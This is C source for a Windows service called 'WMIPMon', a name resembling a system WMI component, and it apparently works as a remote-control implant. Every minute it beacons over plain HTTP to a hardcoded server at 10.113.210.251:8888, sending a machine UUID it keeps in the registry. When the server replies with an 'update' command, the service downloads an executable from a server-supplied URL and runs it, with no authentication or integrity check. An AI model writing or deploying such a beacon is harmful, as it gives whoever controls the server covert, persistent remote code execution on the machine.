#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <string.h>
#include <rpc.h>  // For UUID generation
#include "cJSON.h"  // Make sure cJSON.h is included (from the cJSON library)

#define SERVICE_NAME "WMIPMon"
#define TARGET_URL "http://10.113.210.251"
#define TARGET_HTTP_PORT 8888
#define INTERVAL_MS (1 * 60 * 1000)  // 1 minute

SERVICE_STATUS        g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = NULL;

// Function declarations
void WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
void WINAPI ServiceCtrlHandler(DWORD CtrlCode);
DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);
void MakeHttpPostRequestAndParseJSON(void);
//void LogJsonResponseToFile(const char* jsonResponse); //probably remove in final
BOOL CheckOrCreateUUID(char* outUuid, DWORD outUuidSize);

//global variables because I suck at passing variables between functions
char g_Uuid[64] = { 0 };

#pragma comment(lib, "advapi32.lib") //windos API functions
#pragma comment(lib, "wininet.lib") //windows networking functions
#pragma comment(lib, "shell32.lib") //needed for shell functions
//#pragma comment(lib, "User32.lib") //needed for message box
#pragma comment(lib, "Rpcrt4.lib")  // For UuidCreate and UuidToString


//probably remove the following in final
/*
void LogJsonResponseToFile(const char* jsonResponse) {
    FILE* logFile = fopen("C:\\Users\\Seth\\Desktop\\response_log.txt", "a");
    if (logFile == NULL) {
        printf("Failed to open log file for writing.\n");
        return;
    }

    fprintf(logFile, "%s\n", jsonResponse); // Write the response followed by newline
    fclose(logFile);
}
*/
//probably remove the above in final

int DownloadFile(const char* url, const char* outputFile) {
    HINTERNET hInternet = InternetOpen("MyDownloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpen failed\n");
        return 1;
    }

    HINTERNET hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        printf("InternetOpenUrl failed\n");
        InternetCloseHandle(hInternet);
        return 1;
    }

    FILE* file = fopen(outputFile, "wb");
    if (!file) {
        printf("Failed to open file for writing\n");
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return 1;
    }

    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        fwrite(buffer, 1, bytesRead, file);
    }

    printf("Download complete.\n");

    fclose(file);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    ShellExecute(NULL, "open", outputFile, NULL, NULL, SW_SHOWNORMAL);

    return 0;
}

BOOL CheckOrCreateUUID(char* outUuid, DWORD outUuidSize) {
    if (!outUuid || outUuidSize < 1) return FALSE;

    HKEY hKey;
    LPCSTR subKey = "SOFTWARE\\WOW6432Node\\wmipmon";
    LPCSTR valueName = "uuid";
    DWORD disposition;
    CHAR uuidStr[64] = { 0 };
    DWORD dataSize = sizeof(uuidStr);

    LONG result = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        subKey,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_READ | KEY_WRITE,
        NULL,
        &hKey,
        &disposition
    );

    if (result != ERROR_SUCCESS) {
        return FALSE;
    }

    result = RegQueryValueExA(hKey, valueName, NULL, NULL, (LPBYTE)uuidStr, &dataSize);

    if (result == ERROR_SUCCESS && uuidStr[0] != '\0') {
        strncpy(outUuid, uuidStr, outUuidSize - 1);
        outUuid[outUuidSize - 1] = '\0';  // Ensure null termination
    }
    else {
        UUID uuid;
        if (UuidCreate(&uuid) != RPC_S_OK) {
            RegCloseKey(hKey);
            return FALSE;
        }

        RPC_CSTR strUuid = NULL;
        if (UuidToStringA(&uuid, &strUuid) == RPC_S_OK) {
            RegSetValueExA(hKey, valueName, 0, REG_SZ, strUuid, (DWORD)strlen((char*)strUuid) + 1);
            strncpy(outUuid, (char*)strUuid, outUuidSize - 1);
            outUuid[outUuidSize - 1] = '\0';
            RpcStringFreeA(&strUuid);
        }
        else {
            RegCloseKey(hKey);
            return FALSE;
        }
    }

    RegCloseKey(hKey);
    return TRUE;
}

void MakeHttpPostRequestAndParseJSON(void) {
    char responseBuffer[4096];
    DWORD bytesRead;

    // Step 1: Create JSON body
    cJSON* json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "uuid", g_Uuid);
    cJSON_AddStringToObject(json, "memory", "2GB");
    cJSON_AddStringToObject(json, "cpu", "Intel i5");
    cJSON_AddStringToObject(json, "disk", "256GB SSD");

    char* postData = cJSON_PrintUnformatted(json);
    DWORD postDataLen = (DWORD)strlen(postData);
    const char* headers = "Content-Type: application/json\r\n";

    // Step 2: Open internet connection
    HINTERNET hInternet = InternetOpen("WebPostService", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpen failed: %lu\n", GetLastError());
        cJSON_Delete(json);
        free(postData);
        return;
    }

    // Step 3: Connect to host (hostname/IP only)
    HINTERNET hConnect = InternetConnect(hInternet, "10.113.210.251", TARGET_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("InternetConnect failed: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        cJSON_Delete(json);
        free(postData);
        return;
    }

    // Step 4: Open HTTP POST request
    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/telemetry", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        printf("HttpOpenRequest failed: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        cJSON_Delete(json);
        free(postData);
        return;
    }

    // Step 5: Send POST request
    BOOL result = HttpSendRequest(hRequest, headers, -1L, (LPVOID)postData, postDataLen);
    if (!result) {
        printf("HttpSendRequest failed: %lu\n", GetLastError());
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        cJSON_Delete(json);
        free(postData);
        return;
    }

    // Step 6: Read response
    if (InternetReadFile(hRequest, responseBuffer, sizeof(responseBuffer) - 1, &bytesRead) && bytesRead > 0) {
        responseBuffer[bytesRead] = '\0';
        printf("Response: %s\n", responseBuffer);

        // Step 7: Parse JSON response
        cJSON* responseJson = cJSON_Parse(responseBuffer);
        if (responseJson) {
            cJSON* command = cJSON_GetObjectItemCaseSensitive(responseJson, "command");
            cJSON* parameters = cJSON_GetObjectItemCaseSensitive(responseJson, "parameters");

            if (cJSON_IsString(command) && cJSON_IsString(parameters)) {
                printf("Command: %s\n", command->valuestring);
                printf("Parameters: %s\n", parameters->valuestring);

                if (strcmp(command->valuestring, "update") == 0) {
                    // Call your download function with the given URL
                    DownloadFile(parameters->valuestring, "downloaded_file.exe");
                }
                // else if (...) handle other commands here
            }
            else {
                printf("Invalid or missing command/parameters in JSON\n");
            }

            cJSON_Delete(responseJson);
        }
        else {
            printf("Error parsing JSON response\n");
        }
    }
    else {
        printf("Error reading response or no data received: %lu\n", GetLastError());
    }

    // Step 8: Clean up
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    cJSON_Delete(json);
    free(postData);
}


DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
        MakeHttpPostRequestAndParseJSON();
        Sleep(INTERVAL_MS);
    }
    return 0;
}

void WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
    switch (CtrlCode) {
    case SERVICE_CONTROL_STOP:
        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        g_ServiceStatus.dwWin32ExitCode = 0;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

        SetEvent(g_ServiceStopEvent);
        break;
    default:
        break;
    }
}

void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

    if (!g_StatusHandle)
        return;

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    if (g_ServiceStopEvent == NULL) {
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }

    // --- Call CheckOrCreateUUID here ---
    if (CheckOrCreateUUID(g_Uuid, sizeof(g_Uuid))) {
        printf("UUID: %s\n", g_Uuid);
    }
    else {
        printf("Failed to retrieve or create UUID\n");
    }

    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(g_ServiceStopEvent);

    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 3;
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

int main(void) {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        printf("StartServiceCtrlDispatcher failed (%lu)\n", GetLastError());
    }

    return 0;
}
